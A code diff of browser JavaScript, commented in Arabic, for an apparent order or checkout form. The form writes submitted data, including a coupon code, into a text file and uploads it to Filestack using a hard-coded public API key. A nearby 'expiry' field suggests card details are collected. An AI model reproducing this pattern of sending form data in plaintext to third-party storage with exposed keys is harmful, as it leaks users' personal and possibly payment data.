@@ -171,7 +171,7 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `Coupon Code: ${couponCode}\n`;
 
       // رفع الملف إلى Filestack
-      uploadFileToFilestack(fileContent, email, couponCode);
+      uploadFileToFilestack(fileContent);
 
     }
   });
@@ -247,36 +247,44 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   // دالة لرفع الملف إلى Filestack
-let orderNumber = 1;  // تعيين رقم تسلسلي للطلب
+// دالة لرفع الملف إلى Filestack مع إضافة اسم ملف يحتوي على رقم الطلب المتسلسل
+function uploadFileToFilestack(fileContent) {
+  // التحقق إذا كان رقم الطلب موجودًا في localStorage
+  let orderNumber = localStorage.getItem('orderNumber');
+  
+  if (!orderNumber) {
+    orderNumber = 1; // إذا لم يكن موجودًا، نبدأ من 1
+  } else {
+    orderNumber = parseInt(orderNumber); // تحويله إلى عدد صحيح
+  }
 
-// دالة لرفع الملف إلى Filestack مع إضافة البريد الإلكتروني ورمز القسيمة
-function uploadFileToFilestack(fileContent, email, couponCode) {
-  // توليد اسم الملف باستخدام رمز القسيمة وكلمة order ورقم الطلب المتسلسل والبريد الإلكتروني
-  const fileName = `${couponCode}_order${orderNumber}_${email}.txt`;
+  // توليد اسم الملف باستخدام رقم الطلب المتسلسل
+  const fileName = `order${orderNumber}.txt`;
 
-  // زيادة رقم الطلب للطلب التالي
+  // زيادة رقم الطلب للطلب التالي وتخزينه في localStorage
   orderNumber++;
-
-  const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
+  localStorage.setItem('orderNumber', orderNumber);
 
   // إنشاء Blob للملف النصي
   const fileBlob = new Blob([fileContent], { type: 'text/plain' });
 
-  // رفع الملف باستخدام الخيارات المناسبة وتضمين اسم الملف
+  // استخدام Filestack لرفع الملف
+  const client = filestack.init('Agq3czOxhQoWeCBLRltEez');  // استبدل بـ API Key الخاص بك
   client.upload(fileBlob, {
     filename: fileName  // تمرير اسم الملف هنا
   })
-    .then((response) => {
-      console.log('File uploaded successfully:', response);
+    .then((res) => {
+      console.log('File uploaded successfully:', res);
       console.log(`Uploaded file with name: ${fileName}`);
 
-      // إعادة توجيه المستخدم إلى صفحة "شكراً"
-      window.location.href = 'thank-you.html'; // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
+      // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+      window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
     })
-    .catch((error) => {
-      console.error('Error uploading file:', error);
+    .catch((err) => {
+      console.error('Error uploading file:', err);
     });
 }
+
 
   // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
   const expiryInput = document.getElementById('expiry');
